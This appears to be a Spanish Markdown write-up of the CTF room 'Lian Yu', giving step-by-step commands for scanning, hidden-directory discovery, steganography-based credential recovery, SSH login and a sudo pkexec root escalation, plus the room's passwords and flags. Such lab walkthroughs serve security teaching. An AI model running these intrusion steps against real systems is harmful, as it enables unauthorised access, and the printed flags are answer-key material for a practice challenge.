@@ -1,0 +1,302 @@
+---
+layout: default
+---
+
+# Lian Yu
+
+![Lian Yu](/imagenes/lian_Yu.png)
+
+---
+
+## Fase 1 — Enumeración
+
+### Fase 1.1 — Nmap Port Scan
+
+**Comando ejecutado:**
+```bash
+nmap -sC -sV -oN lian_yu.nmap <TARGET_IP>
+```
+
+**Puertos descubiertos:**
+
+| Puerto  | Servicio | Versión                  |
+|---------|----------|--------------------------|
+| 21/tcp  | FTP      | vsftpd 3.0.2             |
+| 22/tcp  | SSH      | OpenSSH 6.7p1 Debian     |
+| 80/tcp  | HTTP     | Apache httpd             |
+| 111/tcp | RPC      | bind 2-4                 |
+
+**Hallazgos:**
+- Título HTTP: `Purgatory`
+- FTP vsftpd 3.0.2 → posible acceso anónimo
+- SSH versión antigua 6.7p1
+
+![fase1.1_nmap_scan.png](fase1.1_nmap_scan.png)
+
+---
+
+### Fase 1.2 — Enumeración Web
+
+**Comando 1 — Gobuster puerto 80:**
+```bash
+# [MÁQUINA ATACANTE]
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
+```
+
+**Directorios descubiertos:**
+- `/island` → Status 301
+- `/server-status` → Status 403
+
+![fase1.2_gobuster_80.png](fase1.2_gobuster_80.png)
+
+---
+
+**Comando 2 — Visita /island y revisión del código fuente:**
+```
+http://<TARGET_IP>/island
+```
+
+**Hallazgos:**
+- Texto oculto en color blanco en el HTML: `vigilante` → usuario FTP
+- Comentario en el código: `<!--go!go!go!-->`
+
+![fase1.2_island_web.png](fase1.2_island_web.png)
+
+---
+
+**Comando 3 — Gobuster en /island:**
+```bash
+# [MÁQUINA ATACANTE]
+gobuster dir -u http://<TARGET_IP>/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
+```
+
+**Directorios descubiertos:**
+- `/island/2100` → Status 301
+
+![fase1.2_gobuster_island.png](fase1.2_gobuster_island.png)
+
+---
+
+**Comando 4 — Visita /island/2100 y revisión del código fuente:**
+```
+http://<TARGET_IP>/island/2100
+```
+
+**Hallazgos:**
+- Comentario oculto: `<!--you can avail your .ticket here but how?-->`
+- Pista → extensión `.ticket`
+
+![fase1.2_island_2100.png](fase1.2_island_2100.png)
+
+---
+
+**Comando 5 — Gobuster buscando extensión .ticket:**
+```bash
+# [MÁQUINA ATACANTE]
+gobuster dir -u http://<TARGET_IP>/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x ticket -t 50
+```
+
+**Hallazgos:**
+- `green_arrow.ticket` → Status 200
+
+![fase1.2_gobuster_ticket3.png](fase1.2_gobuster_ticket3.png)
+
+---
+
+**Comando 6 — Leer el ticket y decodificar Base58:**
+```bash
+# [MÁQUINA ATACANTE]
+curl http://<TARGET_IP>/island/2100/green_arrow.ticket
+echo "RTy8yhBQdscX" | base58 -d
+```
+
+**Hallazgos:**
+- Token Base58: `RTy8yhBQdscX`
+- Password FTP: `!#th3h00d`
+
+**Credenciales FTP obtenidas:**
+
+| Campo    | Valor       |
+|----------|-------------|
+| Usuario  | vigilante   |
+| Password | !#th3h00d   |
+
+![fase1.2_green_arrow_ticket.png](fase1.2_green_arrow_ticket.png)
+
+![fase1.2_base58_decode.png](fase1.2_base58_decode.png)
+
+---
+
+### Fase 1.3 — Enumeración FTP y Esteganografía
+
+**Comando 1 — Login FTP:**
+```bash
+# [MÁQUINA ATACANTE]
+ftp <TARGET_IP>
+# Usuario: vigilante
+# Password: !#th3h00d
+ls -la
+```
+
+**Hallazgos:**
+- `Leave_me_alone.png` → archivo con cabecera corrupta
+- `Queen's_Gambit.png`
+- `aa.jpg`
+- `.other_user` → archivo oculto con info del usuario `slade`
+
+![fase1.3_ftp_login.png](fase1.3_ftp_login.png)
+
+---
+
+**Comando 2 — Descargar archivos:**
+```bash
+# [MÁQUINA ATACANTE - sesión FTP]
+get Leave_me_alone.png
+get Queen's_Gambit.png
+get aa.jpg
+get .other_user
+```
+
+![fase1.3_ftp_downloads.png](fase1.3_ftp_downloads.png)
+
+---
+
+**Comando 3 — Leer .other_user:**
+```bash
+# [MÁQUINA ATACANTE]
+cat .other_user
+```
+
+**Hallazgos:**
+- Texto sobre Slade Wilson → segundo usuario del sistema: `slade`
+
+![fase1.3_other_user.png](fase1.3_other_user.png)
+
+---
+
+**Comando 4 — Análisis con exiftool:**
+```bash
+# [MÁQUINA ATACANTE]
+exiftool Leave_me_alone.png
+exiftool aa.jpg
+exiftool Queen\'s_Gambit.png
+```
+
+**Hallazgos:**
+- `Leave_me_alone.png` → File format error → cabecera corrupta
+
+![fase1.3_exiftool.png](fase1.3_exiftool.png)
+
+---
+
+**Comando 5 — Verificar y reparar cabecera PNG:**
+```bash
+# [MÁQUINA ATACANTE]
+xxd Leave_me_alone.png | head -2
+hexeditor Leave_me_alone.png
+# Cambiar primeros bytes a: 89 50 4E 47 0D 0A 1A 0A
+exiftool Leave_me_alone.png
+```
+
+**Hallazgos:**
+- Imagen reparada muestra: `password` → contraseña para steghide
+
+![fase1.3_xxd_leave.png](fase1.3_xxd_leave.png)
+
+![fase1.3_leave_fixed.png](fase1.3_leave_fixed.png)
+
+---
+
+**Comando 6 — Extracción esteganográfica:**
+```bash
+# [MÁQUINA ATACANTE]
+steghide extract -sf aa.jpg -p password
+unzip ss.zip
+cat passwd.txt
+cat shado
+```
+
+**Hallazgos:**
+- `ss.zip` extraído de `aa.jpg`
+- `passwd.txt` → texto de relleno sin credenciales útiles
+- `shado` → `M3tahuman` → contraseña SSH
+
+![fase1.3_steghide_aa.png](fase1.3_steghide_aa.png)
+
+![fase1.3_unzip_ss.png](fase1.3_unzip_ss.png)
+
+![fase1.3_passwd_shado.png](fase1.3_passwd_shado.png)
+
+---
+
+## Fase 2 — Foothold
+
+### Fase 2.1 — Acceso SSH como slade
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+ssh slade@<TARGET_IP>
+# Password: M3tahuman
+```
+
+**Hallazgos:**
+- Acceso exitoso como slade
+- Banner: `WELCOME2 LIAN_YU`
+
+![fase2.1_ssh_slade.png](fase2.1_ssh_slade.png)
+
+---
+
+### Fase 2.2 — User Flag
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+ls -la
+cat user.txt
+```
+
+**User Flag:** `THM{P30P7E_K33P_53CRET5__COMPUT3R5_D0N'T}`
+
+![fase2.2_user_flag.png](fase2.2_user_flag.png)
+
+---
+
+## Fase 3 — Escalada de Privilegios
+
+### Fase 3.1 — Escalada a Root vía pkexec
+
+**Comando 1 — Verificar permisos sudo:**
+```bash
+# [MÁQUINA OBJETIVO]
+sudo -l
+```
+
+**Hallazgos:**
+- `slade` puede ejecutar `/usr/bin/pkexec` como root sin contraseña
+
+![fase3.1_sudo_l.png](fase3.1_sudo_l.png)
+
+---
+
+**Comando 2 — Escalada a root:**
+```bash
+# [MÁQUINA OBJETIVO]
+sudo pkexec /bin/bash
+whoami
+```
+
+---
+
+### Fase 3.2 — Root Flag
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+cat root.txt
+```
+
+**Root Flag:** `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`
+
+![fase3.2_root_flag.png](fase3.2_root_flag.png)
